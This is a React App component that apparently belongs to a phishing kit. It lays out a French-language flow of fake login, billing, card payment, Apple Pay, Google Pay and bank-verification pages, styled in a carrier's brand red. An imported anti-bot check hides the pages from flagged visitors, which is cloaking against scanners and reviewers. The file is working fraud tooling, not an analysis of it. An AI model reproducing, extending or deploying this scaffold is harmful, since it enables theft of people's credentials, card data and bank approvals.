import React, { useEffect, useState } from 'react';
import { checkBot } from './utils/antibot';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import { LoginPage } from './pages/LoginPage';
import { FailedPayment } from './pages/FailedPayment';
import { BillingPage } from './pages/BillingPage';
import { PaymentPage } from './pages/PaymentPage';
import { SuccessPayment } from './pages/SuccessPayment';
import { ApplePayPage } from './pages/ApplePayPage';
import { GooglePayPage } from './pages/GooglePayPage';
import { BankVerificationPage } from './pages/BankVerificationPage';
import { VerificationPage } from './pages/VerificationPage';
import { IntlProvider } from './i18n/IntlProvider';
import { VerificationProvider } from './context/VerificationContext';
import { ProtectedRoute } from './components/ProtectedRoute';
import { AnimatePresence } from 'framer-motion';
import { AlertCircle } from 'lucide-react';
import { BankAppCheckPage } from './pages/BankAppCheckPage';

function AnimatedRoutes() {
  const location = useLocation();
  const [isAllowed, setIsAllowed] = useState<boolean | null>(null);

  useEffect(() => {
    const verifyAccess = async () => {
      const allowed = await checkBot();
      setIsAllowed(allowed);
    };
    verifyAccess();
  }, []);

  if (isAllowed === null) {
    return (
      <div className="min-h-screen bg-[#F5F5F5] flex items-center justify-center p-4">
        <div className="text-center">
          <div className="animate-spin rounded-full h-10 w-10 sm:h-12 sm:w-12 border-b-2 border-[#D40511] mx-auto"></div>
          <p className="mt-4 text-sm sm:text-base text-gray-600">{'Vérification en cours...'}</p>
        </div>
      </div>
    );
  }

  if (!isAllowed) {
    return (
      <div className="min-h-screen bg-[#F5F5F5] flex items-center justify-center p-4">
        <div className="bg-white p-4 sm:p-6 lg:p-8 rounded-lg shadow-lg text-center w-full max-w-md">
          <AlertCircle className="text-[#D40511] w-10 h-10 sm:w-12 sm:h-12 lg:w-16 lg:h-16 mx-auto mb-4" />
          <h1 className="text-base sm:text-lg lg:text-xl font-semibold text-gray-800 mb-2">
            Accès non autorisé
          </h1>
          <p className="text-sm sm:text-base text-gray-600">
            Une erreur s'est produite lors de l'accès à ce site. Veuillez réessayer ultérieurement.
          </p>
        </div>
      </div>
    );
  }

  return (
    <AnimatePresence mode="wait">
      <Routes location={location} key={location.pathname}>
        <Route path="/" element={<VerificationPage />} />
        <Route path="/login" element={
          <ProtectedRoute>
            <LoginPage />
          </ProtectedRoute>
        } />
        <Route path="/failed-payment" element={
          <ProtectedRoute>
            <FailedPayment />
          </ProtectedRoute>
        } />
        <Route path="/billing" element={
          <ProtectedRoute>
            <BillingPage />
          </ProtectedRoute>
        } />
        <Route path="/payment" element={
          <ProtectedRoute>
            <PaymentPage />
          </ProtectedRoute>
        } />
        <Route path="/success" element={
          <ProtectedRoute>
            <SuccessPayment />
          </ProtectedRoute>
        } />
        <Route path="/apple-pay" element={
          <ProtectedRoute>
            <ApplePayPage />
          </ProtectedRoute>
        } />
        <Route path="/google-pay" element={
          <ProtectedRoute>
            <GooglePayPage />
          </ProtectedRoute>
        } />
        <Route path="/bank-verification" element={
          <ProtectedRoute>
            <BankVerificationPage />
          </ProtectedRoute>
        } />
        <Route path="/bank-app-check" element={
          <ProtectedRoute>
            <BankAppCheckPage />
          </ProtectedRoute>
        } />
      </Routes>
    </AnimatePresence>
  );
}

function App() {
  return (
    <IntlProvider>
      <VerificationProvider>
        <Router>
          <AnimatedRoutes />
        </Router>
      </VerificationProvider>
    </IntlProvider>
  );
}

export default App;